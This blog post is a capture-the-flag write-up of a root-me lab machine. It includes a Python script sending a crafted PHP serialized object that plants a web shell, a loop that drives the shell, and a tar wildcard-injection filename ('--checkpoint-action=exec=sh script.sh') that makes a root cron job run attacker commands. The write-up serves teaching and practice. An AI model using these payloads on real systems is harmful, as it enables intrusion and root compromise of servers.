---

layout: post
title: "/dev/random: Pipe"
modified: 18 Nov 2016
date: Sat Nov 19 10:32:26 CET 2016
image:
  link: posts/dev-random-pipe/presentation.jpg
  credit_link: https://unsplash.com/

---

Writeup by [npny](https://github.com/npny) and [nobe4](https://github.com/nobe4).

Firstly, we run `nmap` against the website, to discover that (among others), the ports 80 and 22 are open.

`SSH` doesn't yield any results, and we try, without luck, a possible exploit against the used version.

`HTTP` is a lot more interesting:

An HTTP password is asked when trying to access the main page. After a few random try on the different [`HTTP` verbs](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods) we try to access the default `index.php` file, which seems to have the same security. But, making a `POST` request on the file returned a valid `HTML` page. Nice!

We can see in this web page a some useful information:

- there is a javascript file in the subdirectory `scriptz`
- there is an image in the subdirectory `images`

Both directories are not protected and can be accessed and listed.

Moreover, it seems that the file has a link that make a `POST` request and display some information on painters. One crucial note is that the `POST` request is made using a serialize function that (after study) serialize a javascript object into a format that `PHP` can unserialize. A copy of the script can be found [here](http://locutus.io/php/var/serialize/).

The information sent to the server is an object `Info`.

The `images` contains only the image of [La trahison des images](https://en.wikipedia.org/wiki/The_Treachery_of_Images), a famous painting by [René Magritte](https://en.wikipedia.org/wiki/Ren%C3%A9_Magritte). Nothing more here.

The `scriptz` folder contains the `php.js` script as well as a `log.php.BAK` file.

{% highlight php %}
<?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this->filename = '';
        $this->data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";
        $now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this->data';
        eval("\$str = \"$str\";");
    }

    public function __destruct() {
      file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}
?>
{% endhighlight %}


It seems that this file define a simple logging class in PHP. We are not sure what to do with yet...

But, we can combine this class and use it instead of the `Info` one in the `POST` request. Using the following script:

{% highlight python %}

import requests

#  original info object
#  payload = 'O:4:"Info":4:{' \
        #  + 's:2:"id";'\
        #  + 'i:1;'\
        #  + 's:9:"firstname";'\
        #  + 's:4:"Rene";'\
        #  + 's:7:"surname";'\
        #  + 's:8:"Margitte";'\
        #  + 's:7:"artwork";'\
        #  + 's:23:"The Treachery of Images";'\
        #  + '}'

# new Log payload
payload = 'O:3:"Log":2:{' \
        + 's:8:"filename";'\
        + 's:27:"/var/www/html/scriptz/b.php";'\
        + 's:4:"data";'\
        + 's:39:"<?php echo shell_exec($_GET["cmd"]); ?>";'\
        + '}'

data = { 'param': payload }

r = requests.post("http://ctf01.root-me.org/index.php", data=data)
print r.content

{% endhighlight %}


What will happen here is the following:

- The `Log` string will be `unserialize`d by the PHP server script.
- During this step, the `filename` and `data` fields will be saved to a set of defined values.
- When the object is destroyed, the content of `data` will be written in the file `filename`.

We had to figure out the directory to use. After some research, we figured out the [default `Apache` folder](http://askubuntu.com/a/684030/399788) is used.

The payload is a simple web shell and will be placed in the folder `scriptz`.

Now, we must find something to do with this shell, first of, the following script enhance the usage of the web shell:


{% highlight python %}
import requests

base = 'http://ctf01.root-me.org/scriptz/b.php'

while True:
    r = requests.get(base, params = {'cmd': cmd})
    print r.content
    cmd = raw_input('> ')
{% endhighlight %}

This very simple script will get the web page, passing the command as a `GET` argument and display the result.

We immediately check for the `/passwd` file, which is, unfortunately, accessible only by the root user.

After some time looking around, we can see that the files in `/home/rene/backups` are constantly updated. It seems that a backup file is created every minute, and every 5 minutes the 5 backups are compressed together.

Checking the `/etc/crontab` file confirm this, two scripts are running, both as root, this could be the way to leverage the `passwd` file.

{% highlight bash %}

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /root/create_backup.sh
*/5 * * * * root /usr/bin/compress.sh

{% endhighlight %}

A detail that is interesting, is that both scripts are run as root, but one of them is readable:

{% highlight bash %}

#!/bin/sh

rm -f /home/rene/backup/backup.tar.gz
cd /home/rene/backup
tar cfz /home/rene/backup/backup.tar.gz *
chown rene:rene /home/rene/backup/backup.tar.gz
rm -f /home/rene/backup/*.BAK

{% endhighlight %}

The interesting part of the script is the line:

{% highlight bash %}
tar cfz /home/rene/backup/backup.tar.gz *
{% endhighlight %}

Indeed, there is a _vulnerability_ concerning this `*`. If a file or a directory is name like a flag, the command that use the `*` will treat the filename as a flag.

As an example:

{% highlight bash %}
$ touch a b c -la
$ ls
a b c -la
$ ls *
-rw-r--r--  1 user  group  0 Nov 17 18:23 a
-rw-r--r--  1 user  group  0 Nov 17 18:23 b
-rw-r--r--  1 user  group  0 Nov 17 18:23 c
{% endhighlight %}

This issue is discussed in [this paper](https://www.exploit-db.com/papers/33930/).

Now the command that need to be exploited is `tar`, its man page (and the previous paper) gives us the next step:

{% highlight bash %}
--checkpoint-action=exec=<command>
{% endhighlight %}

We now need to find the command we want to execute.

To make this step easier, we decided to use a script file on the server to that will be run by root, we thus need to create a file named:

{% highlight bash %}
--checkpoint-action=exec=sh shell.sh
{% endhighlight %}

Of course, the space in the filename has to be escaped, otherwise the execution will only run `sh`:

{% highlight bash %}
touch home/rene/backup/--checkpoint-action=exec=sh\ script.sh
{% endhighlight %}

The script.sh will contain the following code, which copy the content file into an accessible file, and will change the permission on it, so that anyone can read it:

{% highlight bash %}
cat /passwd > /var/www/html/scriptz/passwd && chmod a+r /var/www/html/scriptz/passwd
{% endhighlight %}

Then we just need to check the file from the browser and we get the flag.
